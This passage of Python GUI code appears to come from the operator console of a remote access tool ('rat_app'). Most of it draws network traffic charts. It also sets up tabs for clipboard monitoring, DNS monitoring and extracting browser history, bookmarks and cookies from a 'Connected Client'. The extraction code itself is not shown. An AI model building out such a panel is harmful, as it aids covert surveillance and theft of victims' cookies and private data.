                spine.set_color(theme["fg_color"])
            
            # Create initial empty pie chart with vibrant colors
            self.protocol_pie = self.protocol_ax.pie([1], labels=['No Data'], autopct='%1.1f%%',
                                            startangle=90, shadow=False, 
                                            textprops={'color': theme["fg_color"]},
                                            colors=[theme["accent_color"]])
            
            self.protocol_ax.set_title("Protocol Distribution", color=theme["accent_color"])
            
            # Create canvas and add to frame
            self.protocol_canvas = FigureCanvasTkAgg(self.protocol_fig, self.protocol_chart_frame)
            self.protocol_canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)
            
        except ImportError:
            # If matplotlib is not available
            fallback_label = tk.Label(self.protocol_chart_frame, 
                                    text="matplotlib required for charts",
                                    bg=theme["card_color"],
                                    fg=theme["fg_color"])
            fallback_label.pack(fill=tk.BOTH, expand=True)

    def update_protocol_chart(self):
        """Update the protocol distribution chart with latest data"""
        try:
            # Only update if there is data and matplotlib is available
            if hasattr(self, 'protocol_ax') and self.network_data['protocols']:
                theme = self.get_theme_colors()
                
                # Get protocol data
                protocols = self.network_data['protocols']
                labels = list(protocols.keys())
                sizes = [protocols[p] for p in labels]
                
                # Define vibrant colors for the chart
                colors = [theme["accent_color"], theme["success_color"], 
                         theme["info_color"], theme["warning_color"],
                         theme["danger_color"]]
                
                # Extend colors if needed
                if len(labels) > len(colors):
                    import matplotlib.cm as cm
                    import numpy as np
                    extra_colors = cm.rainbow(np.linspace(0, 1, len(labels)))
                    colors = extra_colors
                
                # Clear the current chart
                self.protocol_ax.clear()
                
                # Create new pie chart with theme colors
                self.protocol_ax.pie(sizes, labels=labels, autopct='%1.1f%%',
                            startangle=90, shadow=False, 
                            textprops={'color': theme["fg_color"]},
                            colors=colors[:len(labels)])
                            
                self.protocol_ax.set_title("Protocol Distribution", color=theme["accent_color"])
                
                # Update canvas
                self.protocol_canvas.draw()
        except Exception as e:
            self.rat_app.log(f"Error updating protocol chart: {e}")

    def create_traffic_graph(self):
        """Create the initial traffic over time graph"""
        try:
            import matplotlib.pyplot as plt
            from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
            
            # Get theme colors
            theme = self.get_theme_colors()
            
            # Set default style to match theme
            plt.style.use('dark_background')
            
            # Create figure and axes with theme colors
            self.traffic_fig = plt.Figure(figsize=(8, 4), dpi=100, facecolor=theme["card_color"])
            self.traffic_ax = self.traffic_fig.add_subplot(111)
            self.traffic_ax.set_facecolor(theme["card_color"])
            
            # Set text colors to match theme
            self.traffic_ax.tick_params(axis='x', colors=theme["fg_color"])
            self.traffic_ax.tick_params(axis='y', colors=theme["fg_color"])
            
            for spine in self.traffic_ax.spines.values():
                spine.set_color(theme["fg_color"])
            
            # Format the axis with theme colors
            self.traffic_ax.set_xlabel('Time', color=theme["fg_color"])
            self.traffic_ax.set_ylabel('Traffic (Mbps)', color=theme["accent_color"])
            
            # Secondary y-axis for packets with theme color
            self.packet_ax = self.traffic_ax.twinx()
            self.packet_ax.set_ylabel('Packets/sec', color=theme["warning_color"])
            self.packet_ax.tick_params(axis='y', colors=theme["warning_color"])
            
            # Initial plot with empty data using theme colors
            self.traffic_line, = self.traffic_ax.plot([], [], color=theme["accent_color"], lw=2, label='Traffic')
            self.packet_line, = self.packet_ax.plot([], [], color=theme["warning_color"], lw=2, label='Packets')
            
            # Create legend with theme colors
            lines = [self.traffic_line, self.packet_line]
            self.traffic_ax.legend(lines, [l.get_label() for l in lines], loc='upper left',
                                 frameon=True, facecolor=theme["card_color"], 
                                 edgecolor=theme["border_color"], labelcolor=theme["fg_color"])
            
            # Set title with theme color
            self.traffic_ax.set_title("Network Traffic Over Time", color=theme["accent_color"])
            
            # Create canvas and add to frame
            self.traffic_canvas = FigureCanvasTkAgg(self.traffic_fig, self.traffic_graph_frame)
            self.traffic_canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)
            
        except ImportError:
            # If matplotlib is not available
            theme = self.get_theme_colors()
            fallback_label = tk.Label(self.traffic_graph_frame, 
                                    text="matplotlib required for graphs",
                                    bg=theme["card_color"],
                                    fg=theme["fg_color"])
            fallback_label.pack(fill=tk.BOTH, expand=True)

    def update_traffic_graph(self, event=None):
        """Update the traffic graph with the latest data"""
        try:
            # Only update if there is data and matplotlib is available
            if hasattr(self, 'traffic_ax') and self.network_data['traffic_history']:
                
                # Get time range selection
                time_range = self.timerange_var.get()
                seconds = {
                    "1 minute": 60,
                    "5 minutes": 300,
                    "15 minutes": 900,
                    "30 minutes": 1800,
                    "1 hour": 3600
                }.get(time_range, 300)
                
                # Filter data by time range
                current_time = time.time()
                filtered_data = [
                    entry for entry in self.network_data['traffic_history']
                    if entry['timestamp'] > current_time - seconds
                ]
                
                if not filtered_data:
                    return
                
                # Extract data for plotting
                timestamps = [datetime.fromtimestamp(entry['timestamp']) for entry in filtered_data]
                traffic_data = [(entry['bytes_per_sec'] * 8) / 1_000_000 for entry in filtered_data]  # Mbps
                packet_data = [entry['packets_per_sec'] for entry in filtered_data]
                
                # Update the plot data
                self.traffic_line.set_xdata(timestamps)
                self.traffic_line.set_ydata(traffic_data)
                self.packet_line.set_xdata(timestamps)
                self.packet_line.set_ydata(packet_data)
                
                # Adjust axes limits
                self.traffic_ax.set_xlim(min(timestamps), max(timestamps))
                
                if traffic_data:
                    traffic_max = max(traffic_data) * 1.1
                    self.traffic_ax.set_ylim(0, max(1, traffic_max))  # At least 1 Mbps scale
                
                if packet_data:
                    packet_max = max(packet_data) * 1.1
                    self.packet_ax.set_ylim(0, max(10, packet_max))  # At least 10 pps scale
                
                # Format time axis based on range
                if seconds <= 60:
                    self.traffic_ax.xaxis.set_major_formatter(mdates.DateFormatter('%H:%M:%S'))
                else:
                    self.traffic_ax.xaxis.set_major_formatter(mdates.DateFormatter('%H:%M'))
                
                # Rotate date labels
                plt.setp(self.traffic_ax.xaxis.get_majorticklabels(), rotation=45)
                
                # Update canvas
                self.traffic_fig.tight_layout()
                self.traffic_canvas.draw()
                
        except Exception as e:
            self.rat_app.log(f"Error updating traffic graph: {e}")

    def create_frequency_chart(self):
        """Create a chart showing connection frequency by port or protocol"""
        try:
            import matplotlib.pyplot as plt
            from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
            import numpy as np
            
            # Get theme colors
            theme = self.get_theme_colors()
            
            # Set style to match theme
            plt.style.use('dark_background')
            
            # Create tab or frame for frequency chart
            frequency_frame = ctk.CTkFrame(self.adv_monitor_notebook, fg_color=theme["bg_color"])
            self.adv_monitor_notebook.add(frequency_frame, text="Frequency Analysis")
            
            controls_frame = ctk.CTkFrame(frequency_frame, fg_color=theme["card_color"], corner_radius=10)
            controls_frame.pack(fill=tk.X, padx=10, pady=10)
            
            # Option to select what to analyze
            analysis_label = ctk.CTkLabel(controls_frame, text="Analyze by:", text_color=theme["fg_color"])
            analysis_label.pack(side=tk.LEFT, padx=5)
            
            self.frequency_var = tk.StringVar(value="Protocol")
            frequency_menu = ctk.CTkOptionMenu(controls_frame, 
                                            values=["Protocol", "Port", "Source IP", "Destination IP"],
                                            variable=self.frequency_var,
                                            command=self.update_frequency_chart,
                                            fg_color=theme["button_color"],
                                            button_color=theme["accent_color"],
                                            dropdown_fg_color=theme["card_color"],
                                            dropdown_hover_color=theme["hover_color"],
                                            text_color=theme["fg_color"],
                                            dropdown_text_color=theme["fg_color"])
            frequency_menu.pack(side=tk.LEFT, padx=5)
            
            # Limit control
            limit_label = ctk.CTkLabel(controls_frame, text="Top items:", text_color=theme["fg_color"])
            limit_label.pack(side=tk.LEFT, padx=15)
            
            self.limit_var = tk.StringVar(value="10")
            limit_menu = ctk.CTkOptionMenu(controls_frame, 
                                        values=["5", "10", "15", "20", "All"],
                                        variable=self.limit_var,
                                        command=self.update_frequency_chart,
                                        fg_color=theme["button_color"],
                                        button_color=theme["accent_color"],
                                        dropdown_fg_color=theme["card_color"],
                                        dropdown_hover_color=theme["hover_color"],
                                        text_color=theme["fg_color"],
                                        dropdown_text_color=theme["fg_color"])
            limit_menu.pack(side=tk.LEFT, padx=5)
            
            # Create chart frame
            chart_frame = ctk.CTkFrame(frequency_frame, fg_color=theme["card_color"], corner_radius=10)
            chart_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
            
            # Create figure and axis with theme colors
            self.freq_fig = plt.Figure(figsize=(8, 5), dpi=100, facecolor=theme["card_color"])
            self.freq_ax = self.freq_fig.add_subplot(111)
            self.freq_ax.set_facecolor(theme["card_color"])
            
            # Set text colors to match theme
            self.freq_ax.tick_params(colors=theme["fg_color"])
            for spine in self.freq_ax.spines.values():
                spine.set_color(theme["fg_color"])
            
            # Initial empty chart with theme colors
            self.freq_bars = self.freq_ax.bar([], [], color=theme["accent_color"])
            self.freq_ax.set_title("Protocol Frequency", color=theme["accent_color"])
            self.freq_ax.set_ylabel("Count", color=theme["fg_color"])
            self.freq_ax.set_xlabel("", color=theme["fg_color"])
            
            # Add canvas to frame
            self.freq_canvas = FigureCanvasTkAgg(self.freq_fig, chart_frame)
            self.freq_canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)
            
        except ImportError:
            # If matplotlib is not available
            theme = self.get_theme_colors()
            fallback_label = tk.Label(frequency_frame, 
                                    text="matplotlib required for frequency analysis",
                                    bg=theme["card_color"],
                                    fg=theme["fg_color"])
            fallback_label.pack(fill=tk.BOTH, expand=True)

    def update_frequency_chart(self, event=None):
        """Update the frequency chart with current data"""
        try:
            # Only update if there is data and matplotlib is available
            if hasattr(self, 'freq_ax') and self.network_data.get('connections'):
                import numpy as np
                
                # Get theme colors
                theme = self.get_theme_colors()
                
                # Get analysis type and limit
                analysis_type = self.frequency_var.get()
                limit_str = self.limit_var.get()
                limit = int(limit_str) if limit_str != "All" else None
                
                # Prepare data based on analysis type
                data_dict = {}
                
                for conn_key, conn_data in self.network_data['connections'].items():
                    parts = conn_key.split('|')
                    if len(parts) < 4:
                        continue
                    
                    source, destination, protocol, port = parts
                    
                    if analysis_type == "Protocol":
                        key = protocol
                    elif analysis_type == "Port":
                        key = port
                    elif analysis_type == "Source IP":
                        key = source
                    elif analysis_type == "Destination IP":
                        key = destination
                    
                    if key not in data_dict:
                        data_dict[key] = 0
                    data_dict[key] += 1
                
                # Sort by frequency
                sorted_items = sorted(data_dict.items(), key=lambda x: x[1], reverse=True)
                
                # Apply limit
                if limit and len(sorted_items) > limit:
                    top_items = sorted_items[:limit]
                    # Add "Other" category for the rest
                    other_count = sum(item[1] for item in sorted_items[limit:])
                    if other_count > 0:
                        top_items.append(("Other", other_count))
                    sorted_items = top_items
                
                # Extract data for the chart
                labels = [item[0] for item in sorted_items]
                values = [item[1] for item in sorted_items]
                
                # Create vibrant color gradient based on theme
                color_values = np.linspace(0, 0.8, len(sorted_items))
                bar_colors = []
                for i, val in enumerate(color_values):
                    # Use a gradient based on theme accent color and success color
                    if i < len(sorted_items) // 2:
                        bar_colors.append(theme["accent_color"])
                    else:
                        bar_colors.append(theme["success_color"])
                
                # Create chart with theme colors
                self.freq_ax.clear()
                bars = self.freq_ax.bar(labels, values, color=bar_colors)
                
                # Set text colors to match theme
                self.freq_ax.tick_params(axis='x', colors=theme["fg_color"])
                self.freq_ax.tick_params(axis='y', colors=theme["fg_color"])
                
                for spine in self.freq_ax.spines.values():
                    spine.set_color(theme["fg_color"])
                
                # Add value labels on top of bars with theme colors
                for bar in bars:
                    height = bar.get_height()
                    self.freq_ax.annotate(f'{height}',
                                    xy=(bar.get_x() + bar.get_width() / 2, height),
                                    xytext=(0, 3),  # 3 points vertical offset
                                    textcoords="offset points",
                                    ha='center', va='bottom',
                                    color=theme["fg_color"])
                
                # Set labels and title with theme colors
                self.freq_ax.set_title(f"{analysis_type} Frequency", color=theme["accent_color"])
                self.freq_ax.set_ylabel("Connection Count", color=theme["fg_color"])
                
                # Rotate labels if needed
                if analysis_type in ["Source IP", "Destination IP", "Port"] or max(len(str(label)) for label in labels) > 10:
                    plt.setp(self.freq_ax.get_xticklabels(), rotation=45, ha="right", color=theme["fg_color"])
                
                # Update canvas
                self.freq_fig.tight_layout()
                self.freq_canvas.draw()
                
        except Exception as e:
            self.rat_app.log(f"Error updating frequency chart: {e}")
            


    def create_timeline_view(self):
        """Create a timeline view showing when connections were established"""
        try:
            import matplotlib.pyplot as plt
            from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
            from datetime import datetime
            import matplotlib.dates as mdates
            
            # Get theme colors
            theme = self.get_theme_colors()
            
            # Set style to match theme
            plt.style.use('dark_background')
            
            # Create tab or frame for timeline view
            timeline_frame = ctk.CTkFrame(self.adv_monitor_notebook, fg_color=theme["bg_color"])
            self.adv_monitor_notebook.add(timeline_frame, text="Connection Timeline")
            
            # Create chart frame
            chart_frame = ctk.CTkFrame(timeline_frame, fg_color=theme["card_color"], corner_radius=10)
            chart_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
            
            # Create figure and axis with theme colors
            self.timeline_fig = plt.Figure(figsize=(8, 5), dpi=100, facecolor=theme["card_color"])
            self.timeline_ax = self.timeline_fig.add_subplot(111)
            self.timeline_ax.set_facecolor(theme["card_color"])
            
            # Set text colors to match theme
            self.timeline_ax.tick_params(axis='x', colors=theme["fg_color"])
            self.timeline_ax.tick_params(axis='y', colors=theme["fg_color"])
            
            for spine in self.timeline_ax.spines.values():
                spine.set_color(theme["fg_color"])
            
            # Initial empty timeline with theme colors
            self.timeline_ax.set_title("Connection Timeline", color=theme["accent_color"])
            self.timeline_ax.set_xlabel("Time", color=theme["fg_color"])
            self.timeline_ax.set_ylabel("Connections", color=theme["fg_color"])
            
            # Add canvas to frame
            self.timeline_canvas = FigureCanvasTkAgg(self.timeline_fig, chart_frame)
            self.timeline_canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)
            
            # Add update button
            update_btn = ctk.CTkButton(timeline_frame, text="Update Timeline", 
                                    command=self.update_timeline_view,
                                    fg_color=theme["button_color"],
                                    hover_color=theme["hover_color"],
                                    text_color=theme["fg_color"],
                                    border_color=theme["border_color"],
                                    border_width=1)
            update_btn.pack(pady=10)
            self.buttons.append(update_btn)
            
        except ImportError:
            # If matplotlib is not available
            theme = self.get_theme_colors()
            fallback_label = tk.Label(timeline_frame, 
                                    text="matplotlib required for timeline visualization",
                                    bg=theme["card_color"],
                                    fg=theme["fg_color"])
            fallback_label.pack(fill=tk.BOTH, expand=True)
    
    def update_timeline_view(self):
        """Update the connection timeline view"""
        try:
            # Only update if there is data and matplotlib is available
            if hasattr(self, 'timeline_ax') and self.network_data.get('connections'):
                from datetime import datetime
                import matplotlib.dates as mdates
                import numpy as np
                
                # Get theme colors
                theme = self.get_theme_colors()
                
                # Get connection establishment times
                connections = []
                for conn_key, conn_data in self.network_data['connections'].items():
                    first_seen = conn_data.get('first_seen')
                    if first_seen:
                        conn_time = datetime.fromtimestamp(first_seen)
                        parts = conn_key.split('|')
                        if len(parts) >= 4:
                            protocol = parts[2]
                            connections.append((conn_time, protocol))
                
                # Sort by time
                connections.sort(key=lambda x: x[0])
                
                if not connections:
                    return
                
                # Extract data for the chart
                times = [conn[0] for conn in connections]
                protocols = [conn[1] for conn in connections]
                
                # Create colormap for protocols with theme colors
                unique_protocols = list(set(protocols))
                theme_colors = [theme["accent_color"], theme["success_color"], 
                               theme["info_color"], theme["warning_color"], 
                               theme["danger_color"]]
                
                # If we need more colors than provided in theme, extend with a gradient
                if len(unique_protocols) > len(theme_colors):
                    import matplotlib.cm as cm
                    extra_colors = cm.viridis(np.linspace(0, 1, len(unique_protocols)))
                    protocol_colors = {protocol: extra_colors[i] for i, protocol in enumerate(unique_protocols)}
                else:
                    # Use theme colors directly
                    protocol_colors = {unique_protocols[i]: theme_colors[i % len(theme_colors)] 
                                     for i in range(len(unique_protocols))}
                
                # Clear previous plot
                self.timeline_ax.clear()
                
                # Plot connections as scatter plot with theme colors
                for protocol in unique_protocols:
                    protocol_times = [times[i] for i in range(len(times)) if protocols[i] == protocol]
                    protocol_y = [1] * len(protocol_times)  # All at y=1
                    
                    self.timeline_ax.scatter(protocol_times, protocol_y, 
                                        label=protocol, 
                                        color=protocol_colors[protocol],
                                        alpha=0.9,
                                        s=60,
                                        edgecolors=theme["fg_color"])
                
                # Set labels and title with theme colors
                self.timeline_ax.set_title("Connection Timeline", color=theme["accent_color"])
                self.timeline_ax.set_xlabel("Time", color=theme["fg_color"])
                self.timeline_ax.set_yticks([])  # Hide y-axis ticks
                
                # Set text colors to match theme
                self.timeline_ax.tick_params(axis='x', colors=theme["fg_color"])
                
                for spine in self.timeline_ax.spines.values():
                    spine.set_color(theme["fg_color"])
                
                # Format time axis
                time_range = max(times) - min(times)
                if time_range.total_seconds() < 3600:  # Less than an hour
                    self.timeline_ax.xaxis.set_major_formatter(mdates.DateFormatter('%H:%M:%S'))
                else:
                    self.timeline_ax.xaxis.set_major_formatter(mdates.DateFormatter('%H:%M'))
                
                # Add legend with theme colors
                legend = self.timeline_ax.legend(loc='upper right', frameon=True, 
                                              facecolor=theme["card_color"],
                                              edgecolor=theme["border_color"])
                
                # Set legend text color
                for text in legend.get_texts():
                    text.set_color(theme["fg_color"])
                
                # Rotate date labels with theme colors
                plt.setp(self.timeline_ax.xaxis.get_majorticklabels(), 
                       rotation=45, color=theme["fg_color"])
                
                # Update canvas
                self.timeline_fig.tight_layout()
                self.timeline_canvas.draw()
                
        except Exception as e:
            self.rat_app.log(f"Error updating timeline view: {e}")
            
    def update_connections_list(self):
        """Update the connections treeview with the latest data"""
        try:
            # Clear existing items
            for item in self.connections_tree.get_children():
                self.connections_tree.delete(item)
            
            # Get filter text
            filter_text = self.conn_filter_entry.get().lower()
            
            # Sort connections by bytes (highest traffic first)
            sorted_connections = sorted(
                self.network_data['connections'].items(),
                key=lambda x: x[1]['bytes'],
                reverse=True
            )
            
            # Add connections to treeview
            for conn_key, conn_data in sorted_connections:
                # Parse connection key (format: "source|destination|protocol|port")
                parts = conn_key.split('|')
                if len(parts) < 4:
                    continue
                    
                source, destination, protocol, port = parts
                
                # Apply filter if set
                if filter_text and not (
                    filter_text in source.lower() or 
                    filter_text in destination.lower() or
                    filter_text in protocol.lower() or
                    filter_text in port.lower()
                ):
                    continue
                
                # Format timestamp
                last_seen = datetime.fromtimestamp(conn_data['last_seen']).strftime('%H:%M:%S')
                
                # Add to treeview
                self.connections_tree.insert("", "end", values=(
                    source,
                    destination,
                    protocol,
                    port,
                    self.format_size(conn_data['bytes']),
                    conn_data['packets'],
                    last_seen
                ))
        
        except Exception as e:
            self.rat_app.log(f"Error updating connections list: {e}")

    def filter_connections(self, event=None):
        """Filter the connections based on the filter text"""
        self.update_connections_list()
        
        
    def setup_clipboard_tab(self):
        """Setup the clipboard monitoring tab"""
        theme = self.get_theme_colors()
        
        # Create clipboard tab
        self.clipboard_frame = ctk.CTkFrame(self.adv_monitor_notebook, fg_color=theme["card_color"])
        self.adv_monitor_notebook.add(self.clipboard_frame, text="Clipboard Monitoring")
        
        # Controls frame
        controls_frame = ctk.CTkFrame(self.clipboard_frame, fg_color=theme["card_color"], corner_radius=10)
        controls_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Client info display
        client_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        client_frame.pack(fill=tk.X, pady=10, padx=10)
        
        client_label = ctk.CTkLabel(client_frame, text="Connected Client:", text_color=theme["fg_color"])
        client_label.pack(side=tk.LEFT, padx=5)
        
        self.clipboard_client_label = ctk.CTkLabel(client_frame, text="None", text_color=theme["accent_color"])
        self.clipboard_client_label.pack(side=tk.LEFT, padx=5)
        
        # Control buttons
        buttons_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        buttons_frame.pack(fill=tk.X, pady=10, padx=10)
        
        self.start_clipboard_btn = ctk.CTkButton(buttons_frame, text="Start Clipboard Monitoring", 
                                                command=self.start_clipboard_monitoring,
                                                fg_color=theme["button_color"],
                                                hover_color=theme["hover_color"],
                                                text_color=theme["fg_color"],
                                                border_color=theme["border_color"],
                                                border_width=1)
        self.start_clipboard_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.start_clipboard_btn)
        
        self.stop_clipboard_btn = ctk.CTkButton(buttons_frame, text="Stop Clipboard Monitoring", 
                                               command=self.stop_clipboard_monitoring,
                                               state="disabled",
                                               fg_color=theme["button_color"],
                                               hover_color=theme["hover_color"],
                                               text_color=theme["fg_color"],
                                               border_color=theme["border_color"],
                                               border_width=1)
        self.stop_clipboard_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.stop_clipboard_btn)
        
        self.get_clipboard_btn = ctk.CTkButton(buttons_frame, text="Get Clipboard Data", 
                                              command=self.get_clipboard_data,
                                              fg_color=theme["button_color"],
                                              hover_color=theme["hover_color"],
                                              text_color=theme["fg_color"],
                                              border_color=theme["border_color"],
                                              border_width=1)
        self.get_clipboard_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.get_clipboard_btn)
        
        self.clear_clipboard_btn = ctk.CTkButton(buttons_frame, text="Clear Display", 
                                                command=self.clear_clipboard_display,
                                                fg_color=theme["button_color"],
                                                hover_color=theme["hover_color"],
                                                text_color=theme["fg_color"],
                                                border_color=theme["border_color"],
                                                border_width=1)
        self.clear_clipboard_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.clear_clipboard_btn)
        
        # Status frame
        status_frame = ctk.CTkFrame(self.clipboard_frame, fg_color=theme["card_color"], corner_radius=10)
        status_frame.pack(fill=tk.X, padx=10, pady=10)
        
        status_label = ctk.CTkLabel(status_frame, text="Status:", text_color=theme["fg_color"])
        status_label.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.clipboard_status_label = ctk.CTkLabel(status_frame, text="Idle", text_color=theme["info_color"])
        self.clipboard_status_label.pack(side=tk.LEFT, padx=5, pady=5)
        
        # Clipboard data display
        data_frame = ctk.CTkFrame(self.clipboard_frame, fg_color=theme["card_color"], corner_radius=10)
        data_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        data_label = ctk.CTkLabel(data_frame, text="Clipboard Data", text_color=theme["accent_color"])
        data_label.pack(pady=5)
        
        self.clipboard_data_text = scrolledtext.ScrolledText(data_frame, wrap=tk.WORD, 
                                                         background=theme["input_bg"],
                                                         foreground=theme["fg_color"],
                                                         insertbackground=theme["accent_color"],
                                                         selectbackground=theme["accent_color"],
                                                         selectforeground="#000000")
        self.clipboard_data_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.text_widgets.append(self.clipboard_data_text)
    
    def setup_browser_tab(self):
        """Setup the browser data extraction tab"""
        theme = self.get_theme_colors()
        
        # Create browser tab
        self.browser_frame = ctk.CTkFrame(self.adv_monitor_notebook, fg_color=theme["card_color"])
        self.adv_monitor_notebook.add(self.browser_frame, text="Browser Data")
        
        # Controls frame
        controls_frame = ctk.CTkFrame(self.browser_frame, fg_color=theme["card_color"], corner_radius=10)
        controls_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Client info display
        client_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        client_frame.pack(fill=tk.X, pady=10, padx=10)
        
        client_label = ctk.CTkLabel(client_frame, text="Connected Client:", text_color=theme["fg_color"])
        client_label.pack(side=tk.LEFT, padx=5)
        
        self.browser_client_label = ctk.CTkLabel(client_frame, text="None", text_color=theme["accent_color"])
        self.browser_client_label.pack(side=tk.LEFT, padx=5)
        
        # Control buttons
        buttons_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        buttons_frame.pack(fill=tk.X, pady=10, padx=10)
        
        self.extract_browser_btn = ctk.CTkButton(buttons_frame, text="Extract Browser Data", 
                                                command=self.extract_browser_data,
                                                fg_color=theme["button_color"],
                                                hover_color=theme["hover_color"],
                                                text_color=theme["fg_color"],
                                                border_color=theme["border_color"],
                                                border_width=1)
        self.extract_browser_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.extract_browser_btn)
        
        self.save_browser_btn = ctk.CTkButton(buttons_frame, text="Save Data to File", 
                                             command=self.save_browser_data,
                                             state="disabled",
                                             fg_color=theme["button_color"],
                                             hover_color=theme["hover_color"],
                                             text_color=theme["fg_color"],
                                             border_color=theme["border_color"],
                                             border_width=1)
        self.save_browser_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.save_browser_btn)
        
        # Status frame
        status_frame = ctk.CTkFrame(self.browser_frame, fg_color=theme["card_color"], corner_radius=10)
        status_frame.pack(fill=tk.X, padx=10, pady=10)
        
        status_label = ctk.CTkLabel(status_frame, text="Status:", text_color=theme["fg_color"])
        status_label.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.browser_status_label = ctk.CTkLabel(status_frame, text="Idle", text_color=theme["info_color"])
        self.browser_status_label.pack(side=tk.LEFT, padx=5, pady=5)
        
        # Browser selector
        select_frame = ctk.CTkFrame(status_frame, fg_color="transparent")
        select_frame.pack(side=tk.RIGHT, padx=5, pady=5)
        
        browser_label = ctk.CTkLabel(select_frame, text="Browser:", text_color=theme["fg_color"])
        browser_label.pack(side=tk.LEFT, padx=5)
        
        self.browser_var = tk.StringVar(value="chrome")
        browser_options = ctk.CTkOptionMenu(select_frame, values=["chrome", "firefox", "edge"], 
                                          variable=self.browser_var,
                                          fg_color=theme["button_color"],
                                          button_color=theme["accent_color"],
                                          dropdown_fg_color=theme["card_color"],
                                          dropdown_hover_color=theme["hover_color"],
                                          text_color=theme["fg_color"],
                                          dropdown_text_color=theme["fg_color"])
        browser_options.pack(side=tk.LEFT, padx=5)
        
        # Data type selector
        datatype_label = ctk.CTkLabel(select_frame, text="Data Type:", text_color=theme["fg_color"])
        datatype_label.pack(side=tk.LEFT, padx=5)
        
        self.datatype_var = tk.StringVar(value="history")
        datatype_options = ctk.CTkOptionMenu(select_frame, values=["history", "bookmarks", "cookies"], 
                                           variable=self.datatype_var,
                                           fg_color=theme["button_color"],
                                           button_color=theme["accent_color"],
                                           dropdown_fg_color=theme["card_color"],
                                           dropdown_hover_color=theme["hover_color"],
                                           text_color=theme["fg_color"],
                                           dropdown_text_color=theme["fg_color"])
        datatype_options.pack(side=tk.LEFT, padx=5)
        
        # Create notebook for browser data displays
        browser_data_notebook = ttk.Notebook(self.browser_frame, style="Custom.TNotebook")
        browser_data_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Chrome frame
        chrome_frame = ctk.CTkFrame(browser_data_notebook, fg_color=theme["card_color"])
        browser_data_notebook.add(chrome_frame, text="Chrome")
        
        self.chrome_data_text = scrolledtext.ScrolledText(chrome_frame, wrap=tk.WORD, 
                                                      background=theme["input_bg"],
                                                      foreground=theme["fg_color"],
                                                      insertbackground=theme["accent_color"],
                                                      selectbackground=theme["accent_color"],
                                                      selectforeground="#000000")
        self.chrome_data_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.text_widgets.append(self.chrome_data_text)
        
        # Firefox frame
        firefox_frame = ctk.CTkFrame(browser_data_notebook, fg_color=theme["card_color"])
        browser_data_notebook.add(firefox_frame, text="Firefox")
        
        self.firefox_data_text = scrolledtext.ScrolledText(firefox_frame, wrap=tk.WORD, 
                                                       background=theme["input_bg"],
                                                       foreground=theme["fg_color"],
                                                       insertbackground=theme["accent_color"],
                                                       selectbackground=theme["accent_color"],
                                                       selectforeground="#000000")
        self.firefox_data_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.text_widgets.append(self.firefox_data_text)
        
        # Edge frame
        edge_frame = ctk.CTkFrame(browser_data_notebook, fg_color=theme["card_color"])
        browser_data_notebook.add(edge_frame, text="Edge")
        
        self.edge_data_text = scrolledtext.ScrolledText(edge_frame, wrap=tk.WORD, 
                                                    background=theme["input_bg"],
                                                    foreground=theme["fg_color"],
                                                    insertbackground=theme["accent_color"],
                                                    selectbackground=theme["accent_color"],
                                                    selectforeground="#000000")
        self.edge_data_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.text_widgets.append(self.edge_data_text)
        
        # Store browser data
        self.browser_data = None
    
    def setup_dns_tab(self):
        """Setup the DNS monitoring tab"""
        theme = self.get_theme_colors()
        
        # Create DNS tab
        self.dns_frame = ctk.CTkFrame(self.adv_monitor_notebook, fg_color=theme["card_color"])
        self.adv_monitor_notebook.add(self.dns_frame, text="DNS Monitoring")

        # Controls frame
        controls_frame = ctk.CTkFrame(self.dns_frame, fg_color=theme["card_color"], corner_radius=10)
        controls_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Client info display
        client_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        client_frame.pack(fill=tk.X, pady=10, padx=10)
        
        client_label = ctk.CTkLabel(client_frame, text="Connected Client:", text_color=theme["fg_color"])
        client_label.pack(side=tk.LEFT, padx=5)
        
        self.dns_client_label = ctk.CTkLabel(client_frame, text="None", text_color=theme["accent_color"])
        self.dns_client_label.pack(side=tk.LEFT, padx=5)

        # Control buttons
        buttons_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        buttons_frame.pack(fill=tk.X, pady=10, padx=10)
        
        self.start_dns_btn = ctk.CTkButton(buttons_frame, text="Start DNS Monitoring", 
                                          command=self.start_dns_monitoring,
                                          fg_color=theme["button_color"],
                                          hover_color=theme["hover_color"],
                                          text_color=theme["fg_color"],
                                          border_color=theme["border_color"])
        self.start_dns_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.start_dns_btn)
        
        self.stop_dns_btn = ctk.CTkButton(buttons_frame, text="Stop DNS Monitoring", 
                                         command=self.stop_dns_monitoring,
                                         state="disabled",
                                         fg_color=theme["button_color"],
                                         hover_color=theme["hover_color"],
                                         text_color=theme["fg_color"],
                                        border_color=theme["border_color"])
        
        self.stop_dns_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.stop_dns_btn)
        
